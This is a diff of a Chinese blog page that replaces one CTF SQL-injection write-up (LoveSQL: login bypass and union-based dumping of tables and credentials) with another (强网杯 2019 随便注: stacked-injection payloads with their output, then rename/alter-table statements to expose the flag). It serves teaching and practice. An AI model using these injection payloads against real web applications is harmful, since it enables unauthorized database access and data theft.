@@ -16,21 +16,21 @@
   <meta name="author" content="Doraemoo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[极客大挑战 2019]LoveSQL使用万能密码 登陆 11&amp;#x27;or 1&#x3D;1 #  登陆成功后发现password  然而并没有什么用 尝试密码md5解密失败，还是回到注入的思路上，查询字段数： 123?username&#x3D;admin&amp;#x27; order by 4%23&amp;password&#x3D;123&#x2F;&#x2F;   %23是#  得到字段数为3 爆数据库 1?username&#x3D;0&amp;#x27">
+    <meta name="description" content="[强网杯 2019]随便注 堆叠注入11&#x2F;20&#x2F;2020  多云  轻松 .——————————————————————-. 所谓堆叠注入，就是一次性执行多条查询语句 获取数据库 1234567891011121314151617181920212223242526272829303132?inject&#x3D;1&amp;#x27;;show databases;--+[OUTPUT]:ar">
 <meta property="og:type" content="article">
-<meta property="og:title" content="极客大挑战 2019 LoveSQL">
-<meta property="og:url" content="https://doraemoo.github.io/2022/03/02/Dora/index.html">
+<meta property="og:title" content="强网杯 2019 随便注 堆叠注入">
+<meta property="og:url" content="https://doraemoo.github.io/2022/03/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Doraemoo">
-<meta property="og:description" content="[极客大挑战 2019]LoveSQL使用万能密码 登陆 11&amp;#x27;or 1&#x3D;1 #  登陆成功后发现password  然而并没有什么用 尝试密码md5解密失败，还是回到注入的思路上，查询字段数： 123?username&#x3D;admin&amp;#x27; order by 4%23&amp;password&#x3D;123&#x2F;&#x2F;   %23是#  得到字段数为3 爆数据库 1?username&#x3D;0&amp;#x27">
+<meta property="og:description" content="[强网杯 2019]随便注 堆叠注入11&#x2F;20&#x2F;2020  多云  轻松 .——————————————————————-. 所谓堆叠注入，就是一次性执行多条查询语句 获取数据库 1234567891011121314151617181920212223242526272829303132?inject&#x3D;1&amp;#x27;;show databases;--+[OUTPUT]:ar">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-03-02T08:37:10.000Z">
-<meta property="article:modified_time" content="2022-03-02T13:44:41.956Z">
+<meta property="article:published_time" content="2022-03-02T13:43:56.000Z">
+<meta property="article:modified_time" content="2022-03-02T13:45:25.666Z">
 <meta property="article:author" content="Doraemoo">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
   
   
-  <title>极客大挑战 2019 LoveSQL - Doraemoo</title>
+  <title>强网杯 2019 随便注 堆叠注入 - Doraemoo</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -176,7 +176,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="极客大挑战 2019 LoveSQL">
+            <span class="h2" id="subtitle" title="强网杯 2019 随便注 堆叠注入">
               
             </span>
 
@@ -186,8 +186,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-03-02 16:37" pubdate>
-        2022年3月2日 下午
+      <time datetime="2022-03-02 21:43" pubdate>
+        2022年3月2日 晚上
       </time>
     </span>
   
@@ -197,7 +197,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      723 字
+      1.6k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7 分钟
+      14 分钟
     </span>
   
 
@@ -235,33 +235,33 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">极客大挑战 2019 LoveSQL</h1>
+            <h1 style="display: none">强网杯 2019 随便注 堆叠注入</h1>
             
             <div class="markdown-body">
-              <h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>使用万能密码 登陆</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1 #</span><br></code></pre></td></tr></table></figure>
+              <h3 id="强网杯-2019-随便注-堆叠注入"><a href="#强网杯-2019-随便注-堆叠注入" class="headerlink" title="[强网杯 2019]随便注 堆叠注入"></a>[强网杯 2019]随便注 堆叠注入</h3><p>11&#x2F;20&#x2F;2020 </p>
+<p>多云  轻松</p>
+<p>.——————————————————————-.</p>
+<p>所谓堆叠注入，就是一次性执行多条查询语句</p>
+<p>获取数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show databases;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[OUTPUT]:</span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(11) &quot;ctftraining&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(18) &quot;information_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(5) &quot;mysql&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(18) &quot;performance_schema&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(9) &quot;supersqli&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(4) &quot;test&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>登陆成功后发现password  然而并没有什么用</p>
-<p>尝试密码md5解密失败，还是回到注入的思路上，查询字段数：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27; order by 4%23&amp;password=123</span><br><span class="hljs-string"></span><br><span class="hljs-string">//   %23是#</span><br></code></pre></td></tr></table></figure>
+<p>看到了所有的数据库</p>
+<p>查看数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[OUTPUT]:</span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(16) &quot;1919810931114514&quot;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">array(1) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(5) &quot;words&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>得到字段数为3</p>
-<p>爆数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,database(),version()%23&amp;password=123</span><br></code></pre></td></tr></table></figure>
+<p>查看字段信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`; --+</span><br><span class="hljs-string">[OUTPUT]:</span><br><span class="hljs-string">array(6) &#123;</span><br><span class="hljs-string">[0]=&gt;</span><br><span class="hljs-string">string(4) &quot;flag&quot;</span><br><span class="hljs-string">[1]=&gt;</span><br><span class="hljs-string">string(12) &quot;varchar(100)&quot;</span><br><span class="hljs-string">[2]=&gt;</span><br><span class="hljs-string">string(2) &quot;NO&quot;</span><br><span class="hljs-string">[3]=&gt;</span><br><span class="hljs-string">string(0) &quot;&quot;</span><br><span class="hljs-string">[4]=&gt;</span><br><span class="hljs-string">NULL</span><br><span class="hljs-string">[5]=&gt;</span><br><span class="hljs-string">string(0) &quot;&quot;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>爆数据表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=123</span><br></code></pre></td></tr></table></figure>
+<p>原题目查询的数据表为words。既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为其他，再把1919810931114514改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p>
+<p>payload如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">rename table `words` to `test`;</span><br><span class="hljs-string">rename table `1919810931114514` to `words`;</span><br><span class="hljs-string">alter table `words` change `flag` `id` varchar(100);</span><br><span class="hljs-string">show columns from words;--+</span><br><span class="hljs-string"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span><br></code></pre></td></tr></table></figure>
 
-<p>发现两个表geekuser,l0ve1ysq1</p>
-<p>猜测flag在l0ve1ysq1里</p>
-<p>爆字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>l0ve1ysq1<span class="hljs-string">&#x27;%23&amp;password=123</span><br></code></pre></td></tr></table></figure>
+<p>使用 &#x2F;?inject&#x3D;1’ or 1&#x3D;’1 访问一下即可获得 flag</p>
+<p>MySQL中反引号和单引号的区别与用法</p>
+<p>MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等<br>引号则用来标注语句中所引用的字符型常量或日期&#x2F;时间型常量，即字段值<br>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `username` <span class="hljs-keyword">where</span> `name`<span class="hljs-operator">=</span>&quot;peri0d&quot;<br></code></pre></td></tr></table></figure>
 
-<p>发现三个字段id,username,password</p>
-<p>查看字段内容</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=123</span><br></code></pre></td></tr></table></figure>
-
-<p>得到flag</p>
+<p>ps:原来desc 可以查看数据表的结构！！！</p>
 
             </div>
             <hr>
@@ -289,15 +289,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/03/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">强网杯 2019 随便注 堆叠注入</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2022/03/02/Dora/">
+                        <span class="hidden-mobile">极客大挑战 2019 LoveSQL</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
